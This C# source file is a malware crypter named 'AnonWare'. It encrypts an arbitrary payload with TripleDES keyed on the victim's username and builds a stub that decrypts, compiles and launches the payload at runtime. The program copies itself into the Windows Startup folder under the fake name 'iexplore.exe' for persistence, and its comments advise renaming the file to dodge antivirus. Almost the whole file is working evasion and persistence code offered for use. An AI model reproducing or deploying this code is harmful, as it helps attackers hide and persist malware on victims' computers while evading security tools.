﻿using System;
using System.Text;
using System.Security.Cryptography;
using Microsoft.CSharp;
using System.Diagnostics;
using System.CodeDom.Compiler;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;

namespace AnonWare_CSharp
{
    class Program
    {
        public static void Main(string[] args)
        {
            string AnonWareSource = "insert code here"; //remember to delete all comments starting with //, as these will throw a compiler error. also, all "s, 's, \s, and some other stuff, will require you to put \ in front of it
            string AnonWareEncrypted = EncryptString(AnonWareSource, Environment.UserName.ToString());
            CSharpCodeProvider myCodeProvider = new CSharpCodeProvider();
            ICodeCompiler myCodeCompiler = myCodeProvider.CreateCompiler();
            String[] referenceAssemblies = { "System.dll", "Microsoft.CSharp.dll", "System.Core.dll", "System.Data.dll", "System.Data.DataSetExtensions.dll", "System.Deployment.dll", "System.Xml.dll", "System.Xml.Linq.dll" }; //if you plan to do more than really simple stuff with it, add stuff to this list (seperate them with commas)
            string myAssemblyName = "assemble.exe";
            CompilerParameters myCompilerParameters = new CompilerParameters(referenceAssemblies, myAssemblyName);
            myCompilerParameters.GenerateExecutable = true;
            myCompilerParameters.GenerateInMemory = true;
            CompilerResults compres = myCodeCompiler.CompileAssemblyFromSource(myCompilerParameters, "using System;using System.Text;using System.Security.Cryptography;using Microsoft.CSharp;using System.Diagnostics;using System.Runtime.InteropServices;using System.Management;using System.Threading;using System.CodeDom.Compiler;using System.Net;using System.IO;namespace Crypt0n{    class MainClass    {        public static void Main(string[] args)        {   string Code = \"" + AnonWareEncrypted + "\";            string Password = Environment.UserName.ToString();            string DecryptedCode = DecryptString(Code, Password);            CSharpCodeProvider myCodeProvider = new CSharpCodeProvider();            ICodeCompiler myCodeCompiler = myCodeProvider.CreateCompiler();            String[] referenceAssemblies = { \"System.dll\", \"Microsoft.CSharp.dll\", \"System.Core.dll\", \"System.Data.dll\", \"System.Data.DataSetExtensions.dll\", \"System.Deployment.dll\", \"System.Xml.dll\", \"System.Xml.Linq.dll\" };            string myAssemblyName = \"assemble2.exe\";            CompilerParameters myCompilerParameters = new CompilerParameters(referenceAssemblies, myAssemblyName);            myCompilerParameters.GenerateExecutable = true;            myCompilerParameters.GenerateInMemory = true;            CompilerResults compres = myCodeCompiler.CompileAssemblyFromSource(myCompilerParameters, DecryptedCode);          Process.Start(\"assemble2.exe\");     }        public static string DecryptString(string Message, string Passphrase)        {            byte[] Results;            System.Text.UTF8Encoding UTF8 = new System.Text.UTF8Encoding();       MD5CryptoServiceProvider HashProvider = new MD5CryptoServiceProvider();            byte[] TDESKey = HashProvider.ComputeHash(UTF8.GetBytes(Passphrase));           TripleDESCryptoServiceProvider TDESAlgorithm = new TripleDESCryptoServiceProvider();            TDESAlgorithm.Key = TDESKey;            TDESAlgorithm.Mode = CipherMode.ECB;            TDESAlgorithm.Padding = PaddingMode.PKCS7;            byte[] DataToDecrypt = Convert.FromBase64String(Message);            try            {                ICryptoTransform Decryptor = TDESAlgorithm.CreateDecryptor();                Results = Decryptor.TransformFinalBlock(DataToDecrypt, 0, DataToDecrypt.Length);            }            finally            {         TDESAlgorithm.Clear();    HashProvider.Clear();  }     return UTF8.GetString(Results);    }    }}" + "");
            File.Move("assemble.exe", Environment.GetEnvironmentVariable("appdata") + @"\Microsoft\Windows\Start Menu\Programs\Startup\iexplore.exe");
            Process.Start(Environment.GetEnvironmentVariable("appdata").ToString() + @"\Microsoft\Windows\Start Menu\Programs\Startup\iexplore.exe"); //for AV purposes, it's recommended that you change the name of this, or even make the name self-creating 
        }
        public static string EncryptString(string Message, string Passphrase)
        {
            byte[] Results;
            System.Text.UTF8Encoding UTF8 = new System.Text.UTF8Encoding();

            // Step 1. We hash the passphrase using MD5
            // We use the MD5 hash generator as the result is a 128 bit byte array
            // which is a valid length for the TripleDES encoder we use below

            MD5CryptoServiceProvider HashProvider = new MD5CryptoServiceProvider();
            byte[] TDESKey = HashProvider.ComputeHash(UTF8.GetBytes(Passphrase));

            // Step 2. Create a new TripleDESCryptoServiceProvider object
            TripleDESCryptoServiceProvider TDESAlgorithm = new TripleDESCryptoServiceProvider();

            // Step 3. Setup the encoder
            TDESAlgorithm.Key = TDESKey;
            TDESAlgorithm.Mode = CipherMode.ECB;
            TDESAlgorithm.Padding = PaddingMode.PKCS7;

            // Step 4. Convert the input string to a byte[]
            byte[] DataToEncrypt = UTF8.GetBytes(Message);

            // Step 5. Attempt to encrypt the string
            try
            {
                ICryptoTransform Encryptor = TDESAlgorithm.CreateEncryptor();
                Results = Encryptor.TransformFinalBlock(DataToEncrypt, 0, DataToEncrypt.Length);
            }
            finally
            {
                // Clear the TripleDes and Hashprovider services of any sensitive information
                TDESAlgorithm.Clear();
                HashProvider.Clear();
            }

            // Step 6. Return the encrypted string as a base64 encoded string
            return Convert.ToBase64String(Results);
        }
    }
}
